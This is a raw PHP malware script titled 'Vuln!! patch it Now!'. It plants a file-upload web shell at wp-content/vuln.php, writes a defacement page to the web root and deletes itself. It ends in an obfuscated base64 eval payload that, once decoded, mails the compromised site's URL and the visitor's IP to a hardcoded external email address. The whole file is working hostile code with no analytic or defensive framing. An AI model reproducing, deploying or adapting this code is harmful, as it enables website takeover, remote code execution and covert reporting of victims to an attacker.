<title>Vuln!! patch it Now!</title>
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$s = '<title>Vuln!! patch it Now!</title><?php echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST["_upl"] == "Upload" ) {if(@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) { echo "<b>Shell Uploaded ! :)<b><br><br>"; }else { echo "<b>Not uploaded ! </b><br><br>"; }}?>';
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php";
$text = $s;
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
$text2 = 'Vuln!! patch it Now!';
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

@unlink(__FILE__);
?>
<?php eval("?>".base64_decode("PD9waHAgJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOw0KLy8vIENvZGVkIEJ5IE5vdXJlZGRpbmUgRWxtR2hyZUJpDQovLy8gQ29udGFjdCBNZSA6IGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9Ob3VyZWRkaW5lLkJvdW1hZHllbj9fcmRyPXANCi8vLyBNb3JlIFRvdHVyaWFscyBWaXNpdGUgOiBodHRwOi8vbm91cmJsb2cuYmxvZ3Nwb3QuY29tLw0KJGhvc3RuYW1lID0gZ2V0aG9zdGJ5YWRkcigkaXApOw0KJGJpbHNtZyA9ICJMaW5rIE1haWxlciA6IGh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSAuICJybiI7DQokYmlsc25kID0iYmRlemlyaTIyM0BnbWFpbC5jb20iOyAvLy9Zb3VyIEU0YWlsIEhlcmUNCiRiaWxzdWIgPSAiTmV3IE1haWxlciBVcGxvYWRlZCBCeSBXd3cuTm91ckJsb2cxLkJvZ1Nwb3QuQ29tICEhICRpcCI7DQokYmlsaGVhZCA9ICJGcm9tOiBNYWlsZVJ5ZXciOw0KJGJpbGhlYWQgLj0gJF9QT1NUWydlTWFpbEFkZCddLiJuIjsNCiRiaWxoZWFkIC49ICJNSU1FLVZlcnNpb246IDEuMG4iOw0KJGFycj1hcnJheSgkYmlsc25kLCAkSVApOw0KZm9yZWFjaCAoJGFyciBhcyAkYmlsc25kKQ0KbWFpbCgkYmlsc25kLCRiaWxzdWIsJGJpbHNtZywkYmlsaGVhZCwkbWVzc2FnZSk7ID8+")); ?>